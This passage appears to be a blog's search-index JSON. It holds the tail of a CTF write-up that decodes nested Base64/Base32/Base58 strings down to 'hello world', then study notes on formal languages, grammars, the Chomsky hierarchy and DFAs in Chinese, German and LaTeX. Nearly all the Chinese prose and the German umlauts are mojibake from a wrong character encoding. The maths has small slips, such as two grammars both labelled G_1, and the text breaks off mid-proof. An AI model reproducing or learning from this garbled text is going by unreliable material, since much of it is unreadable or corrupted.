(UTF-8)ç»“æœï¼šSk5URUdVQ1RLNDJFT1dEUkdOR1VRVUNCSkJZVk0zTFBMQVlUS01LVVBCWVVDWkNIRzVXVUczU0VPNVhFTVZSWU1WTUZHTkNUT1ZERkVWU01IRjJHTVZTRU5OTERTUkQyTkpORTRZU1lOTkdHV1JSUk9WQ0ZRWTJLç¬¬4æ­¥ - Base64 (UTF-8)ç»“æœï¼šJNTEGUCTK42EOWDRGNGUQUCBJBYVM3LPLAYTKMKUPBYUCZCHG5WUG3SEO5XEMVRYMVMFGNCTOVDFEVSMHF2GMVSENNLDSRD2NJNE4YSYNNGGWRRROVCFQY2Kç¬¬5æ­¥ - Base32 (UTF-8)ç»“æœï¼šKfCPSW4GXq3MHPAHqVmoX151TxqAdG7mCnDwnFV8eXS4SuFRVL9tfVDkV9DzjZNbXkLkF1uDXcJç¬¬6æ­¥ - Base58 (UTF-8)ç»“æœï¼š4npCTEQcUgxRUY2DRDCpq4jmaCGw8BXZ557XUXvaYf6cK63oEYV1SwWç¬¬7æ­¥ - Base58 (UTF-8)ç»“æœï¼šLFKWIV3DGJFEQT2HMRVU22TMGVMWWZCSKBIT2PI=ç¬¬8æ­¥ - Base32 (UTF-8)ç»“æœï¼šYUdWc2JHOGdkMjl5YkdRPQ==ç¬¬9æ­¥ - Base64 (UTF-8)ç»“æœï¼šaGVsbG8gd29ybGQ=ç¬¬10æ­¥ - Base64 (UTF-8)ç»“æœï¼šhello world","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"decode","slug":"decode","permalink":"https://archer-baiyi.github.io/tags/decode/"},{"name":"è§£ç ","slug":"è§£ç ","permalink":"https://archer-baiyi.github.io/tags/%E8%A7%A3%E7%A0%81/"},{"name":"base 64","slug":"base-64","permalink":"https://archer-baiyi.github.io/tags/base-64/"}]},{"title":"Theoretische Informatik ç†è®ºä¿¡æ¯å­¦","slug":"TUM info ç¬”è®°/Theoretische Informatik/Theoretische-Informatik-ç†è®ºä¿¡æ¯å­¦","date":"2025-04-27T21:56:41.000Z","updated":"2025-09-29T17:18:01.959Z","comments":true,"path":"2025/04/27/TUM info ç¬”è®°/Theoretische Informatik/Theoretische-Informatik-ç†è®ºä¿¡æ¯å­¦/","permalink":"https://archer-baiyi.github.io/2025/04/27/TUM%20info%20%E7%AC%94%E8%AE%B0/Theoretische%20Informatik/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/","excerpt":"ç†è®ºä¿¡æ¯å­¦ç›¸å…³ç¬”è®°","text":"å¤§çº²/æ€»ç»“ 2.Grundbegriffe 2.1 Grammatiken 2.2 Die Chomsky-Hierarchieï¼š Typ 0 (Phrasenstruktur), 1 (Kontextsensitive), 2 (Kontextfreie), 3 (Rechtslinear, RegulÃ¤r) 3.RegulÃ¤re Sprachen ï¼ˆTyp 3ï¼‰ 3.1 Deterministische endliche Automaten 3.2 Von rechtslinearen Grammatiken zu DFA (und zurÃ¼ck) 3.3 NFAs mit epsilon-ÃœbergÃ¤ngen 3.4 RegulÃ¤re AusdrÃ¼cke 3.5 Von NFA zu RE als LÃ¶sung eines Gleichungssystemsï¼š æ¨å¯¼NFAå¯¹åº”çš„REï¼Œä»¥åŠä»REå¯¹åº”çš„NFAã€‚ 3.6 Rechnen mit regulÃ¤ren AusdrÃ¼ckenï¼š ä¸€äº›ç­‰ä»·çš„REã€‚ 3.7 Abschlusseigenschaften regulÃ¤rer Sprachenï¼š regulÃ¤rer Sprachençš„äº¤å¹¶é›†ï¼Œè¡¥é›†ï¼Œä¹˜é›†ç­‰éƒ½æ˜¯regulÃ¤rerçš„ã€‚ 3.8 Pumping Lemmaï¼š RegulÃ¤re Spracheçš„ç‰¹æ®Šæ€§è´¨ï¼Œå¯ä»¥ç”¨äºè¯æ˜æŸä¸ªSpracheä¸æ˜¯regulÃ¤rçš„ã€‚ 3.9 Entscheidungsverfahrenï¼š ä»¥ä¸‹å‡ ä¸ªé—®é¢˜çš„å¯è§£æ€§ä»¥åŠå¤æ‚åº¦ï¼šWortproblem, Leerheitsproblem, Endlichkeitsproblem, Ã„quivalenzproblemã€‚ 3.10 Minimierung endlicher Automatenï¼š æ¯ä¸ªDFAéƒ½èƒ½ï¼ˆåˆ©ç”¨ç­‰ä»·ç±»ï¼‰åŒ–ç®€åˆ°minimalã€‚ 4.Kontextfreie Sprachen ï¼ˆTyp 2ï¼‰ 4.1 Kontextfreie Grammatiken Syntaxbaumï¼Œå¤ä¹ å®šä¹‰ï¼Œæ–°ç¼©å†™ï¼šCFG ï¼ˆKontextfreie Grammatikï¼‰ï¼ŒCFL ï¼ˆKontextfreie Spracheï¼‰ã€‚ 4.2 Induktive Definitionen, SyntaxbÃ¤ume und Ableitungen Wortçš„æ¨å¯¼/ç”Ÿæˆéƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„Syntaxbaumã€‚ 4.3 Die Chomsky-Normalform epsilon-Produktionï¼ŒKettenproduktionï¼Œï¼ˆå¦‚ä½•æ„é€ ï¼‰Chomsky-Normalformï¼ŒGreibach-Normalformã€‚ 4.4 Das Pumping-Lemma fÃ¼r kontextfreie Sprachenï¼š å’Œä¹‹å‰çš„ç±»ä¼¼ï¼Œé€‚åˆç”¨äºè¯æ˜æŸä¸ªSpracheä¸æ˜¯kontextfreiçš„ã€‚ 4.5 Abschlusseigenschaftenï¼š Vereinigungï¼ŒKonkatenationï¼ŒSternï¼ŒSpiegelungåçš„éƒ½è¿˜æ˜¯kontextfreiï¼Œä½†æ˜¯äº¤é›†ï¼Œè¡¥é›†ä¸ä¸€å®šæ˜¯äº†ã€‚ 4.6 Algorithmen fÃ¼r kontextfreie Grammatiken 4.7 Der Cocke-Younger-Kasami-Algorithmus CYKç®—æ³•ï¼Œç”¨äºéªŒè¯ä¸€ä¸ªå•è¯æ˜¯å¦å±äºä¸€ä¸ªæ–‡æ³•ï¼ˆGrammatikï¼‰ã€‚ 4.8 Kellerautomaten Pushdown Automaton ï¼ˆPDAï¼‰ 4.9 Ã„quivalenz von PDAs und CFGs 4.10 Deterministische Kellerautomaten 4.11 Tabellarischer Ãœberblick 5. Berechenbarkeit, Entscheidbarkeit 5.1 Der Begriff der Berechenbarkeit Berechenbarkeitï¼ŒTuringmaschine 5.2 Unentscheidbarkeit des Halteproblems 5.3 Semi-Entscheidbarkeit 5.4 Die SÃ¤tze von Rice und Shapiro 5.5 Das Postsche Korrespondenzproblem 5.6 Unentscheidbare CFG-Probleme 6. KomplexitÃ¤tstheorie 6.1 Die KomplexitÃ¤tsklasse P 6.2 Die KomplexitÃ¤tsklasse NP 6.3 NP-VollstÃ¤ndigkeit 6.4 Weitere NP-vollstÃ¤ndige Probleme 6.5 Die UnvollstÃ¤ndigkeit der Arithmetik 6.6 Die Entscheidbarkeit der Presburger Arithmetik éœ€è¦æŒæ¡çš„ç®—æ³•ï¼š ç¬¬ä¸‰ç« ï¼š Grammatikè½¬NFAï¼ˆSatz 3.9ï¼›H 3.1ï¼ŒT 2.2ï¼‰ NFAè½¬DFA ï¼ˆSatz 3.10ï¼‰ Potenzmengenkonstruktionï¼ˆH 3.2ï¼‰ DFAè½¬Grammatik ï¼ˆSatz 3.13ï¼‰ epsilon-NFAè½¬NFAï¼ˆLemma 3.16ï¼‰ NFAè½¬regulÃ¤r Ausdruck ç”»å›¾ï¼ˆT 4.1ï¼‰ é«˜æ–¯æ¶ˆå…ƒ/è§£æ–¹ç¨‹/Ardens Lemmaï¼ˆT 4.2ï¼ŒH 4.1ï¼‰ RegulÃ¤r Ausdruckè½¬epsilon-NFAï¼ˆT 3.3ï¼ŒH 3.4ï¼‰ DFA Minimierungï¼ˆTabelleï¼‰ï¼ˆT 5.3 a)ï¼ŒH 5.3ï¼‰ æ„é€ regulÃ¤r Ausdruckå¯¹åº”çš„Minimalautomat ç¬¬å››ç« ï¼š æ„é€ CFGçš„Chomsky-Normalformï¼ˆT 7.1ï¼ŒT 7.4ï¼ŒH 7.1ï¼‰ æ¶ˆé™¤Grammatikçš„unnÃ¼tzliche Symboleï¼ˆT 8.1ï¼ŒH 8.1ï¼‰ CYKï¼ˆCYK Tabelleï¼Œç”¨äºéªŒè¯ä¸€ä¸ªå•è¯æ˜¯å¦å±äºä¸€ä¸ªæ–‡æ³•ï¼ˆGrammatikï¼‰ï¼‰ï¼ˆT 8.2 b)ï¼ŒT 8.5ï¼ŒH 8.2.ï¼‰ Grammatikè½¬PDAï¼ˆSatz 4.53ï¼ŒT 9.3ï¼‰ CFGè½¬PDA PDAè½¬CFG ä¸åŒTypeçš„è¯­è¨€ä»¥åŠå¯¹åº”çš„è‡ªåŠ¨æœºï¼š Typ Automat Typ 3 (Deterministischer) Endliche Autoamt / deterministic finite automaton (FA) Typ 2 Kellerautomat / Pushdown Automaton (PDA) Typ 0 Turingmaschinen (TM) åŸºæœ¬æ¦‚å¿µDefinition:ä¸€ä¸ªå­—æ¯è¡¨ï¼ˆAlphabetï¼‰ $\\Sigma$ æ˜¯ä¸€ä¸ªæœ‰é™é›†åˆã€‚ä¾‹å¦‚ï¼š$ \\{0,1\\} $ã€ASCIIã€Unicodeã€‚ä¸€ä¸ªå•è¯/å­—ç¬¦ä¸² ï¼ˆWort/Stringï¼‰æ˜¯ç”±$\\Sigma$ä¸­å­—ç¬¦ç»„æˆçš„æœ‰é™åºåˆ—ï¼Œä¾‹å¦‚ 010ã€‚$|w|$è¡¨ç¤ºå•è¯$ w $ çš„é•¿åº¦ã€‚ç©ºå•è¯ï¼ˆleere Wortï¼‰ï¼ˆé•¿åº¦ä¸º 0 çš„å”¯ä¸€å•è¯ï¼‰ç”¨$\\varepsilon$è¡¨ç¤ºã€‚å¦‚æœ $u$ å’Œ $v$ æ˜¯å•è¯ï¼Œåˆ™ $uv$ è¡¨ç¤ºå®ƒä»¬çš„è¿æ¥ï¼ˆKonkatenationï¼‰ã€‚å¦‚æœ $ w $ æ˜¯ä¸€ä¸ªå•è¯ï¼Œé‚£ä¹ˆ $w^n$ å®šä¹‰ä¸ºï¼š$ w^0 = \\varepsilon $ï¼Œå¹¶ä¸” $ w^{n+1} = w w^n $ã€‚ä¾‹å¦‚ï¼š$ (ab)^3 = ababab $ã€‚$ \\Sigma^* $ æ˜¯æ‰€æœ‰ç”± $ \\Sigma $ ä¸­å­—ç¬¦ç»„æˆçš„å•è¯çš„é›†åˆï¼ˆMenge aller WÃ¶rterï¼‰ã€‚å…¶ä¸­çš„å­é›†$ L \\subseteq \\Sigma^* $ è¢«ç§°ä¸ºï¼ˆå½¢å¼ï¼‰è¯­è¨€ ï¼ˆ(formale) Spracheï¼‰ã€‚ æ³¨æ„ï¼Œè¿™é‡Œçš„å½¢å¼è¯­è¨€ï¼ˆ(formale) Spracheï¼‰$L$å¹¶æ²¡æœ‰è¦æ±‚å¿…é¡»åŒ…å«$\\varepsilon$ã€‚ æ¥çœ‹ä¸€ä¸‹ç®€å•çš„ï¼ˆå½¢å¼ï¼‰è¯­è¨€ ï¼ˆ(formale) Spracheï¼‰çš„ä¾‹å­ï¼š æœç™»ï¼ˆDudenï¼‰è¯å…¸ä¸­æ‰€æœ‰å•è¯çš„é›†åˆ $L_1 = \\{ \\varepsilon, ab, abab, ababab, \\dots \\} = \\{ (ab)^n \\mid n \\in \\mathbb{N} \\}$ ï¼ˆ$\\Sigma_1 = \\{a, b\\}$ï¼‰ $L_2 = \\{ \\varepsilon, ab, aabb, abab, abba, baab, baba, bbaa, \\dots \\} = \\{ w \\in \\{a,b\\}^* \\mid w\\ \\text{ä¸­åŒ…å«ç›¸åŒæ•°é‡çš„}\\ a\\ \\text{å’Œ}\\ b\\ \\text{å­—ç¬¦} \\}$ ï¼ˆ$\\Sigma_2 = \\{a, b\\}$ï¼‰ $L_3 = \\{0, 1, 100, 1001, 10000, \\dots\\} = \\{ w \\in \\{0,1\\}^* \\mid w\\ \\text{æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶ç¼–ç çš„å¹³æ–¹æ•°} \\}$ ï¼ˆ$\\Sigma_3 = \\{0,1\\}$ï¼‰ $\\emptyset$ $\\{\\varepsilon\\}$ åä¾‹ï¼š $\\varepsilon$ æˆ– $ab$ ä¸æ˜¯è¯­è¨€ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯é›†åˆã€‚ Definition: è¯­è¨€ä¸Šçš„è¿ç®—ï¼ˆOperationen auf Sprachenï¼‰è®¾ $A, B \\subseteq \\Sigma^*$ï¼šè¿æ¥ï¼ˆKonkatenationï¼‰ï¼š$AB := \\{ uv \\mid u \\in A \\land v \\in B \\}$ä¾‹å­ï¼š$\\{ab, b\\} \\{a, bb\\} = \\{aba, abbb, ba, bbb\\}$A^n := \\{ w_1 \\dots w_n \\mid w_1, \\dots, w_n \\in A \\} = \\underbrace{A \\cdots A}_{n}ä¾‹å­ï¼š$\\{ab, ba\\}^2 = \\{abab, abba, baab, baba\\}$é€’å½’å®šä¹‰ï¼š$A^0 = \\{\\varepsilon\\} \\quad \\text{ä¸”} \\quad A^{n+1} := A A^n$A^* := \\{ w_1 \\dots w_n \\mid n \\geq 0 \\land w_1, \\dots, w_n \\in A \\} = \\bigcup_{n \\in \\mathbb{N}} A^nä¾‹å­ï¼š\\{01\\}^* = \\{\\varepsilon, 01, 0101, 010101, \\dots\\} \\neq \\{0,1\\}^*A^+ := AA^* = \\bigcup_{n \\geq 1} A^n æ³¨æ„ï¼Œå› ä¸º$A^0 = \\{ \\varepsilon \\}$ï¼Œæ‰€ä»¥å¯¹äºæ‰€æœ‰ $A$ éƒ½æœ‰ï¼š$\\varepsilon \\in A^$ï¼Œå¹¶ä¸” $\\emptyset^ = \\{ \\varepsilon \\}$ã€‚ Lemma:$\\emptyset A = \\emptyset$$\\{\\varepsilon\\}A = A$ è¯æ˜ï¼šTrivialã€‚$\\square$ Lemma:$A(B \\cup C) = AB \\cup AC$$(A \\cup B)C = AC \\cup BC$ è¯æ˜ï¼šTrivialã€‚$\\square$ ä½†æ˜¯æ³¨æ„ï¼Œ$A(B \\cap C) \\neq AB \\cap AC$ä¸ä¸€å®šä¸€ç›´æˆç«‹ã€‚ åä¾‹ï¼š$A=\\{a,ab\\}, B=\\{b\\}, C =\\{\\varepsilon\\}$ï¼š A(B\\cap C) = A \\emptyset = \\emptyset AB \\cap AC = \\{ab,abb\\} \\cap \\{a,ab\\} = \\{ab\\} \\neq \\emptysetæœ€æ ¹æœ¬çš„åŸå› æ˜¯å¯èƒ½å­˜åœ¨$uâ€™vâ€™= uâ€™â€™vâ€™â€™ \\in AB \\cap AC$å¹¶ä¸”$uâ€™ \\neq uâ€™â€™, vâ€™ \\neq vâ€™â€™$ã€‚è¿™å°±å¯¼è‡´ä¸èƒ½ä»$uv \\in AB \\cap AC$æ¨å‡ºå­˜åœ¨$u \\in A, v \\in B \\cap C$ã€‚ Lemma:A^* A^* = A^* è¯æ˜ï¼šTrivialã€‚$\\square$ æ–‡æ³•ï¼ˆGrammatikenï¼‰Definition:ä¸€ä¸ªæ–‡æ³•ï¼ˆGrammatikï¼‰æ˜¯ä¸€ä¸ªå››å…ƒç»„ $G = (V, \\Sigma, P, S)$ï¼Œå…¶ä¸­ï¼š$V$ æ˜¯ä¸€ç»„éç»ˆç»“ç¬¦å·ï¼ˆNichtterminalzeichen / Nichtterminale / Variablenï¼‰çš„æœ‰é™é›†åˆï¼›$\\Sigma$ æ˜¯ä¸€ç»„ç»ˆç»“ç¬¦å·ï¼ˆTerminalzeichen / Terminale / Alphabetï¼‰ï¼Œä¸ $V$ ä¸ç›¸äº¤ï¼›P \\subseteq (V \\cup \\Sigma)^* \\times (V \\cup \\Sigma)^*æ˜¯ä¸€ç»„äº§ç”Ÿå¼ï¼ˆProduktionenï¼‰çš„é›†åˆï¼›$S \\in V$ æ˜¯å¼€å§‹ç¬¦å·ï¼ˆStartsymbolï¼‰ã€‚ ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨ï¼š $\\alpha \\to \\beta$ æŒ‡ä»£ $(\\alpha, \\beta) \\in P$ï¼› $\\alpha \\to \\beta_1|\\cdots |\\beta_n$ æŒ‡ä»£ $\\alpha \\to \\beta_1, â€¦, \\alpha \\to \\beta_n$ Definition:ä¸€ä¸ªæ–‡æ³•ï¼ˆGrammatikï¼‰ $G = (V, \\Sigma, P, S)$ induziert ä¸€ä¸ªæ¨å¯¼å…³ç³» $\\to_G$ï¼Œä½œç”¨äº $V \\cup \\Sigma$ ä¸Šçš„å•è¯ï¼š\\alpha \\to_G \\alpha'å½“ä¸”ä»…å½“å­˜åœ¨ä¸€æ¡è§„åˆ™ $\\beta \\to \\betaâ€™$ å±äº $P$ï¼Œä»¥åŠå•è¯ $\\alpha_1, \\alpha_2$ï¼Œä½¿å¾—\\alpha = \\alpha_1 \\beta \\alpha_2 \\quad \\text{ä¸”} \\quad \\alpha' = \\alpha_1 \\beta' \\alpha_2.ä¸€ä¸ªè¿™æ ·çš„åºåˆ—\\alpha_1 \\to_G \\alpha_2 \\to_G \\cdots \\to_G \\alpha_nå«åšä» $\\alpha_1$ å¼€å§‹çš„æ¨å¯¼ï¼ˆAbleitungï¼‰ã€‚å¦‚æœ $\\alpha_1 = S$ å¹¶ä¸”\\alpha_n \\in \\Sigma^* ï¼Œé‚£ä¹ˆ $G$ ç”Ÿæˆï¼ˆerzeugtï¼‰å•è¯ $\\alpha_n$ã€‚$G$ çš„è¯­è¨€ï¼ˆSprache von Gï¼‰æ˜¯æ‰€æœ‰ç”± $G$ ç”Ÿæˆçš„å•è¯çš„é›†åˆï¼Œè®°ä¸º $L(G)$ã€‚ æ³¨æ„ï¼Œå®šä¹‰é‡Œçš„$\\alpha_1, \\alpha_2$å¯ä»¥æ˜¯$\\varepsilon$ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–å•è¯çš„Konkatenationã€‚æ‰€ä»¥åœ¨ä¸€ä¸ªå¤§çš„Konkatenationé‡Œï¼Œå¯¹äºå…¶ä¸­ä¸€ä¸ªå­˜åœ¨Produktionï¼Œé‚£ä¹ˆå¯¹æ•´ä¸ªKonkatenationéƒ½å­˜åœ¨ä¸€ä¸ªæ¨å¯¼ã€‚ ä¾‹å­ï¼š $V = \\{ \\langle \\text{Expr} \\rangle, \\langle \\text{Term} \\rangle, \\langle \\text{Factor} \\rangle \\}$ $\\Sigma = \\{ a, b, c, +, *, (, ) \\}$ $S = \\langle \\text{Expr} \\rangle$ $P$ï¼š \\begin{align} \\langle \\text{Expr} \\rangle &\\to \\langle \\text{Term} \\rangle \\\\ \\langle \\text{Expr} \\rangle &\\to \\langle \\text{Expr} \\rangle + \\langle \\text{Term} \\rangle \\\\ \\langle \\text{Term} \\rangle &\\to \\langle \\text{Factor} \\rangle \\\\ \\langle \\text{Term} \\rangle &\\to \\langle \\text{Term} \\rangle * \\langle \\text{Factor} \\rangle \\\\ \\langle \\text{Factor} \\rangle &\\to a\\ \\mid\\ b\\ \\mid\\ c \\\\ \\langle \\text{Factor} \\rangle &\\to (\\langle \\text{Expr} \\rangle) \\end{align} è¯¥å¦‚ä½•ä»$\\langle \\text{Expr} \\rangle$æ¨å¯¼å‡º$a * (b + c)$å‘¢ï¼Ÿ \\begin{align*} \\langle \\text{Expr} \\rangle &\\xrightarrow{1} \\langle \\text{Term} \\rangle \\xrightarrow{4} \\langle \\text{Term} \\rangle * \\langle \\text{Factor} \\rangle \\xrightarrow{3} \\langle \\text{Factor} \\rangle * \\langle \\text{Factor} \\rangle \\\\ &\\xrightarrow{5} a * \\langle \\text{Factor} \\rangle \\xrightarrow{6} a * (\\langle \\text{Expr} \\rangle) \\xrightarrow{2} a * (\\langle \\text{Expr} \\rangle + \\langle \\text{Term} \\rangle) \\\\ &\\xrightarrow{1} a * (\\langle \\text{Term} \\rangle + \\langle \\text{Term} \\rangle) \\xrightarrow{3} a * (\\langle \\text{Factor} \\rangle + \\langle \\text{Term} \\rangle) \\xrightarrow{3} a * (\\langle \\text{Factor} \\rangle + \\langle \\text{Factor} \\rangle)\\\\ &\\xrightarrow{5} a * (b + \\langle \\text{Factor} \\rangle) \\xrightarrow{5} a * (b+ c) \\end{align*}ä¸€å…±éœ€è¦11æ­¥ã€‚ ä¾‹å­ï¼š è¿™ä¸¤ä¸ªè¯­æ³•ï¼š \\begin{align*} G_1: \\quad S &\\to abcS \\mid \\epsilon \\\\ ba &\\to ab \\\\ cb &\\to bc \\\\ ca &\\to ac \\end{align*} \\begin{align*} G_1: \\quad S &\\to aBSc \\mid \\epsilon \\\\ Ba &\\to aB \\\\ Bb &\\to bB \\\\ Bc &\\to bc \\end{align*}å“ªä¸ªå¯ä»¥ç”Ÿæˆ$M = \\{ a^n b^n c^n \\mid n \\geq 0 \\}$å‘¢ï¼Ÿ é¦–å…ˆï¼Œæœ‰$M \\subseteq L(G_1)$ï¼Œå› ä¸º$S \\to abcS \\to abcabcS \\to abcabc \\to abacbc \\to aabcbc \\to aabbcc$ã€‚ åªä¸è¿‡$L(G_1) \\neq M$ï¼Œå› ä¸º$S \\to abcS \\to abcabcS \\to abcabc$ã€‚ è€Œ$L(G_2) = M$ï¼Œå› ä¸ºï¼š S \\to aBSc \\to aBaBcc \\to aBaBcc \\to aaBBcc \\to aaBbcc \\to aabBcc \\to aabbcc.Definition: (Reflexive transitive HÃ¼lle)\\begin{align*}\\alpha &\\to_G^0 \\alpha \\\\\\alpha &\\to_G^{n+1} \\gamma \\quad :\\Leftrightarrow \\quad \\exists \\beta.\\ \\alpha \\to_G^n \\beta \\to_G \\gamma \\\\\\alpha &\\to_G^* \\beta \\quad :\\Leftrightarrow \\quad \\exists n.\\ \\alpha \\to_G^n \\beta \\\\\\alpha &\\to_G^+ \\beta \\quad :\\Leftrightarrow \\quad \\exists n > 0.\\ \\alpha \\to_G^n \\beta\\end{align*} ä¸éš¾æ³¨æ„åˆ°æœ‰ï¼š L(G) = \\{ w \\in \\Sigma^* | S \\to_G^* w \\}.ä¾‹å­ï¼šåœ¨å‰é¢çš„ä¾‹å­æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†$\\langle \\text{Expr} \\rangle$æ¨å¯¼å‡º$a * (b + c)$éœ€è¦11æ­¥ï¼Œæ‰€ä»¥æœ‰ \\langle \\text{Expr} \\rangle \\to_G^{11} a * (b + c)å¹¶å› æ­¤æœ‰ \\langle \\text{Expr} \\rangle \\to_G^* a * (b + c)å’Œ \\langle \\text{Expr} \\rangle \\to_G^+ a * (b + c)ä¹”å§†æ–¯åŸºä½“ç³»ï¼ˆChomsky Hierarchieï¼‰Definition:ä¸€ä¸ªæ–‡æ³• $G$ çš„ç±»å‹å®šä¹‰å¦‚ä¸‹ï¼šç±»å‹ 0ï¼šå§‹ç»ˆæˆç«‹ã€‚ç±»å‹ 1ï¼šå¦‚æœå¯¹äºæ¯ä¸€ä¸ªäº§ç”Ÿå¼ $\\alpha \\to \\beta$ï¼ˆé™¤äº† $S \\to \\varepsilon$ï¼‰éƒ½æœ‰|\\alpha| \\leq |\\beta|å¹¶ä¸”ï¼Œå¦‚æœ $S \\to \\varepsilon$ æ˜¯ä¸€ä¸ªäº§ç”Ÿå¼ï¼Œåˆ™ $S$ ä¸å‡ºç°åœ¨ä»»ä½• $\\beta$ ä¸­ã€‚ç±»å‹ 2ï¼šå¦‚æœ $G$ æ˜¯ç±»å‹ 1 çš„æ–‡æ³•ï¼Œå¹¶ä¸”å¯¹äºæ¯ä¸ªäº§ç”Ÿå¼ $\\alpha \\to \\beta$ï¼Œéƒ½æœ‰\\alpha \\in Vç±»å‹ 3ï¼šå¦‚æœ $G$ æ˜¯ç±»å‹ 2 çš„æ–‡æ³•ï¼Œå¹¶ä¸”å¯¹äºæ¯ä¸ªäº§ç”Ÿå¼ $\\alpha \\to \\beta$ï¼ˆé™¤äº† $S \\to \\varepsilon$ï¼‰éƒ½æœ‰\\beta \\in \\Sigma \\cup \\Sigma V æ˜¾ç„¶æœ‰ï¼š \\text{Typ 3} \\subseteq \\text{Typ 2} \\subseteq \\text{Typ 1} \\subseteq \\text{Typ 0}Theorem:L(\\text{Typ 3}) \\subseteq L(\\text{Typ 2}) \\subseteq L(\\text{Typ 1}) \\subseteq L(\\text{Typ 0}) Typ Grammatikart Sprachklasse Typ 3 Rechtslineare Grammatik RegulÃ¤re Sprachen Typ 2 Kontextfreie Grammatik Kontextfreie Sprachen Typ 1 Kontextsensitive Grammatik Kontextsensitive Sprachen Typ 0 Phrasenstrukturgrammatik Rekursiv aufzÃ¤hlbare Sprachen Wortproblemï¼š Gegeben: ä¸€ä¸ªæ–‡æ³• $G$ å’Œä¸€ä¸ªå•è¯ $w \\in \\Sigma^*$ï¼Œ Frageï¼š$w$ æ˜¯å¦å±äº $L(G)$ï¼Ÿ ä¸åŒTypeçš„è¯­è¨€ä»¥åŠå¯¹åº”çš„è‡ªåŠ¨æœºï¼š Typ Automat Typ 3 (Deterministischer) Endliche Autoamt / deterministic finite automaton (FA) Typ 2 Kellerautomat / Pushdown Automaton (PDA) Typ 0 Turingmaschinen (TM) æ­£è§„è¯­è¨€ï¼ˆRegulÃ¤re Sprachenï¼‰ç­‰ä»·å…³ç³»ï¼š Deterministische endliche AutomatenDefinition:Ein deterministischer endlicher Automat (deterministic finite automaton, DFA)$M = (Q, \\Sigma, \\delta, q_0, F)$ besteht auseiner endlichen Menge von ZustÃ¤nden $Q$,einem (endlichen) Eingabealphabet $\\Sigma$,einer (totalen!) Ãœbergangsfunktion $\\delta : Q \\times \\Sigma \\rightarrow Q$,einem Startzustand $q_0 \\in Q$, undeiner Menge $F \\subseteq Q$ von EndzustÃ¤nden (akzeptierenden Zust.). åå­—é‡Œçš„deterministischæ˜¯æŒ‡ï¼šå¯¹äºæ¯ä¸€ä¸ªçŠ¶æ€ï¼ˆZustandï¼‰ä»¥åŠä¸€ä¸ªÃœbergangåªå¯¹åº”ä¸€ä¸ªçŠ¶æ€ï¼ˆZustandï¼‰ã€‚ Definition:Die von $M$ akzeptierte Sprache istL(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},wobei $\\hat{\\delta} : Q \\times \\Sigma^* \\rightarrow Q$ induktiv definiert ist durch:\\begin{aligned}\\hat{\\delta}(q, \\varepsilon) &= q \\\\\\hat{\\delta}(q, aw) &= \\hat{\\delta}(\\delta(q, a), w) \\quad \\text{fÃ¼r } a \\in \\Sigma,\\, w \\in \\Sigma^*.\\end{aligned}( $\\hat{\\delta}(q, w)$ bezeichnet den Zustand, den man aus $q$ mit $w$ erreicht. )Eine Sprache ist regulÃ¤r gdw. sie von einem DFA akzeptiert wird. å¯ä»¥è¿™æ ·ç†è§£$\\hat{\\delta}$ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯èµ·å§‹çŠ¶å†µï¼ˆZustandï¼‰ï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°çš„ä¸€è¿ä¸²çš„è·¯å¾„ï¼ˆæˆ–è€…è¯´æ˜¯æ“ä½œï¼‰ï¼Œä¼šä¾æ¬¡è§¦å‘/ç»è¿‡ã€‚ æ‰€ä»¥ L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},é‡Œçš„å…ƒç´ ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯ï¼šæ‰€æœ‰ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯å¾„/æ“ä½œåºåˆ—ã€‚ æ‰€æœ‰endliche Automatenéƒ½å¯ä»¥ç”¨gerichtete und makierte Zustandsgraphè¡¨ç¤ºå‡ºæ¥ï¼Œå…¶ä¸­ ç‚¹ï¼ˆKnotenï¼‰ä»£è¡¨ZustÃ¤ndeï¼› çº¿ï¼ˆKantenï¼‰è¡¨ç¤ºÃœbergÃ¤nge $p \\xrightarrow{a} q$ ï¼Œå³$\\delta(p,a)= q$ï¼› Anfangszustand ä¼šè¢«ç”¨ä¸€ä¸ªç®­å¤´ï¼ˆPfeilï¼‰æ ‡è®°å‡ºæ¥ï¼› EndzustÃ¤nde ä¼šè¢«ç”¨doppelte Kreiseæ ‡è®°å‡ºæ¥ã€‚ ä¾‹å­ï¼š $Q = \\{0,1,2\\}$ $\\Sigma = \\{a,b\\}$ ä¸éš¾æ³¨æ„åˆ°ï¼Œåœ¨è¿™é‡Œä¾‹å­é‡Œï¼Œæ‰€æœ‰å¯ä»¥è¢«akzeptiertçš„Wortéƒ½ä¸€å®šåŒ…å«abã€‚ï¼ˆç›¸å½“äºå¿…ç»ä¹‹è·¯ï¼‰ åŒæ ·ï¼Œæ‰€æœ‰åŒ…å«abçš„Wortä¹Ÿä¸€å®šä¼šè¢«akzeptiertã€‚ ä¾‹å­ï¼š æˆ‘ä»¬ç”¨#wè¡¨ç¤ºwçš„äºŒè¿›åˆ¶ã€‚ï¼ˆæ¯”å¦‚è¯´#100=4ï¼‰ ä¸éš¾å‘ç°ï¼ŒDFA akzeptiert $w \\in \\{0,1\\}^*$å½“ä¸”ä»…å½“#wæ˜¯å¶æ•°ã€‚ è¯æ˜ï¼š å‡è®¾$w \\neq \\varepsilon$ï¼Œå¯ä»¥é€šè¿‡ \\hat{\\delta}(0, w0) = \\delta(\\hat{\\delta}(0, w), 0) = 0 \\in F \\hat{\\delta}(0, w1) = \\delta(\\hat{\\delta}(0, w), 1) = 1 \\notin Få¯ä»¥å¾—åˆ° w0 \\in L(A), 